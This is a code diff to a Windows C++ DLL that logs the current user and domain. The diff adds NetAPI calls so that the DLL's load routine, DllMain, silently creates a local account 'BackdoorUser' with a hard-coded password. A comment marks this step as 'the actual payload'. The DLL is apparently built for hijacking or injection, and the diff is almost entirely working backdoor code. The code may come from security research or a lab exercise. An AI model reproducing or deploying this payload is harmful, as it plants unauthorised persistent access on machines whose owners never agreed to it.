@@ -1,9 +1,12 @@
 #include <windows.h>
 #include <sddl.h>
+#include <lm.h>
 
 #include <iostream>
 #include <fstream>
 #include <sstream>
+
+#pragma comment(lib, "Netapi32.lib")
 
 using namespace std;
 
@@ -76,7 +79,54 @@ int getUserDomainString(string &userAndDomain)
     CloseHandle(hToken);
     free(pTokenUser);
     return ret;
-}    
+}
+
+bool userExists(LPWSTR username)
+{
+    LPUSER_INFO_0 pUserInfo = nullptr;
+    NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);
+
+    if (status == NERR_Success)
+    {
+        NetApiBufferFree(pUserInfo);
+        return true;
+    } 
+    else if (status == NERR_UserNotFound)
+    {
+        return false;
+    } 
+    else
+    {
+        std::cerr << "Error checking user: " << status << std::endl;
+        return false;
+    }
+}
+
+void createUser(LPWSTR pUserName, LPWSTR passwd)
+{
+    // Set up user info
+    USER_INFO_1 ui;
+    ui.usri1_name = pUserName;
+    ui.usri1_password = passwd;
+    ui.usri1_priv = USER_PRIV_USER;
+    ui.usri1_home_dir = nullptr;
+    ui.usri1_comment = nullptr;
+    ui.usri1_flags = UF_SCRIPT;
+    ui.usri1_script_path = nullptr;
+
+    DWORD dwError = 0;
+    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
+
+    if (nStatus == NERR_Success)
+    {
+        wprintf(L"User created successfully.\n");
+    }
+    else
+    {
+        wprintf(L"Failed to create user. Error: %d\n", nStatus);
+    }
+}
+
 
 BOOL APIENTRY DllMain(HMODULE hModule,
                       DWORD  ul_reason_for_call,
@@ -91,6 +141,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         {
             std::cout << "User and domain: " << userAndDomain << "\n";
             writeInfo(userAndDomain);
+
+            // The actual payload comes here
+            if (!userExists(L"BackdoorUser"))
+            {
+                createUser(L"BackdoorUser", L"BackdoorPasswd");
+            }
         }
         else
         {
